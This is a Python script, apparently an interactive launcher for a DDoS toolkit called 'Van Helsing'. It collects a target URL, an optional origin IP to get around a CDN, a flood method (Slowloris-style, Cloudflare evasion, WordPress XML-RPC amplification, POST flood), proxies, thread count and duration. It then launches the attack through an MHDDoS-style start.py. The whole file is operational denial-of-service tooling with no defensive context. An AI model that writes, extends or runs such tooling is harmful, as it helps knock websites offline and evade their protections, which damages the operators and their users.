#!/usr/bin/env python3
import os
import sys
import subprocess

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    OKRED = '\033[91m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def banner():
    print(f"""{bcolors.OKRED}
    ╦  ╦╔═╗╔╗╔  ╦ ╦╔═╗╦  ╔═╗╦╔╗╔╔═╗
    ╚╗╔╝╠═╣║║║  ╠═╣║╣ ║  ╚═╗║║║║║ ╦
     ╚╝ ╩ ╩╝╚╝  ╩ ╩╚═╝╩═╝╚═╝╩╝╚╝╚═╝ DoS
    {bcolors.WARNING}Interactive Commander v1.0{bcolors.RESET}
    """)

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def main():
    clear()
    banner()

    print(f"{bcolors.HEADER}[ SELECT METHOD ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] SLOW    - (Best for Windows/Apache/XAMPP)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] DYN     - (Best for Nginx/Cloudflare/Evasion)")
    print(f"[{bcolors.OKCYAN}3{bcolors.RESET}] STRESS  - (High Load/Universal Stress Test)")
    print(f"[{bcolors.OKCYAN}4{bcolors.RESET}] XMLRPC  - (WordPress Amplification Method)")
    print(f"[{bcolors.OKCYAN}5{bcolors.RESET}] POST_DYN- (Phase 2: Non-Cacheable POST Flood)")
    print("")
    
    choice = input(f"{bcolors.BOLD}Choose Method (1-5): {bcolors.RESET}")
    methods = {"1": "SLOW", "2": "DYN", "3": "STRESS", "4": "XMLRPC", "5": "POST_DYN"}
    method = methods.get(choice, "SLOW")

    clear()
    banner()
    print(f"{bcolors.HEADER}[ TARGET CONFIGURATION ]{bcolors.RESET}")
    url = input(f"Target URL (e.g. https://example.com): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    origin_ip = input(f"Origin IP (Optional, press Enter to skip): {bcolors.OKBLUE}").strip()
    print(f"{bcolors.RESET}", end="")
    
    if origin_ip:
        target = f"{url}@{origin_ip}"
    else:
        target = url

    clear()
    banner()
    print(f"{bcolors.HEADER}[ PROXY CONFIGURATION ]{bcolors.RESET}")
    print(f"[{bcolors.OKCYAN}1{bcolors.RESET}] Public Proxy (Auto-Scavenge/Download)")
    print(f"[{bcolors.OKCYAN}2{bcolors.RESET}] Private Proxy (From your own file)")
    
    proxy_choice = input(f"{bcolors.BOLD}Choose Proxy Type (1-2): {bcolors.RESET}")
    
    if proxy_choice == "2":
        proxy_file = input(f"Enter proxy filename (e.g. proxy.txt): {bcolors.OKBLUE}").strip()
        print(f"{bcolors.RESET}", end="")
    else:
        proxy_file = "proxy.txt"

    clear()
    banner()
    print(f"{bcolors.HEADER}[ INTENSITY CONFIGURATION ]{bcolors.RESET}")
    print(f"{bcolors.WARNING}Note: Running multiple terminals is better than high thread counts.{bcolors.RESET}")
    
    threads = input(f"Threads (Recommended: 100-500, current best: 100): {bcolors.OKBLUE}").strip() or "100"
    print(f"{bcolors.RESET}", end="")
    
    rpc = input(f"RPC (Requests Per Connection, Default: 5): {bcolors.OKBLUE}").strip() or "5"
    print(f"{bcolors.RESET}", end="")
    
    duration = input(f"Duration in Seconds (e.g. 800): {bcolors.OKBLUE}").strip() or "800"
    print(f"{bcolors.RESET}", end="")

    # Preparation for execution
    # MHDDoS/VanHelsing structure: python3 start.py <METHOD> <URL> <PROXY_TYPE> <THREADS> <PROXY_FILE> <RPC> <DURATION>
    # Proxy Type mapping: SOCKS5 is usually 5
    proxy_type = "5" 

    cmd = [
        "python3", "start.py",
        method,
        target,
        proxy_type,
        threads,
        proxy_file,
        rpc,
        duration
    ]

    clear()
    banner()
    print(f"{bcolors.OKGREEN}CONFIGURATION COMPLETE!{bcolors.RESET}")
    print(f"Method   : {bcolors.OKBLUE}{method}{bcolors.RESET}")
    print(f"Target   : {bcolors.OKBLUE}{target}{bcolors.RESET}")
    print(f"Threads  : {bcolors.OKBLUE}{threads}{bcolors.RESET}")
    print(f"Duration : {bcolors.OKBLUE}{duration}s{bcolors.RESET}")
    print("-" * 30)
    print(f"{bcolors.BOLD}Launching Attack...{bcolors.RESET}")
    
    try:
        subprocess.run(cmd)
    except KeyboardInterrupt:
        print(f"\n{bcolors.WARNING}Attack stopped by user.{bcolors.RESET}")
    except Exception as e:
        print(f"\n{bcolors.FAIL}Error: {e}{bcolors.RESET}")

if __name__ == "__main__":
    main()
